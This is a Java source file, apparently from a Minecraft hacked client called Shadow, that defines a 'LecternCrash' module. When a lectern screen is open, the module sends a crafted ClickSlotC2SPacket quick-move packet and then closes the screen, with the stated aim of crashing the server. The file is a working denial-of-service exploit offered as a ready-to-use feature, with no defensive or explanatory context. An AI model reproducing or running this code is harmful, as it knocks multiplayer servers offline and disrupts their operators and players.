/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.LecternScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

public class LecternCrash extends Module {
    public LecternCrash() {
        super("LecternCrash", "Crashes the server when you right click a lectern", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        if (client.player.currentScreenHandler instanceof LecternScreenHandler handler) {
            int sid = handler.syncId;
            ClickSlotC2SPacket p = new ClickSlotC2SPacket(sid, 0, 0, 0, SlotActionType.QUICK_MOVE, new ItemStack(Items.AIR), new Int2ObjectOpenHashMap<>());
            client.getNetworkHandler().sendPacket(p);
            client.player.closeHandledScreen();
            Notification.create(5000, "LecternCrash", Notification.Type.SUCCESS, "Sent exploit packet");
        }
    }

    @Override
    public void enable() {

    }

    @Override
    public void disable() {

    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
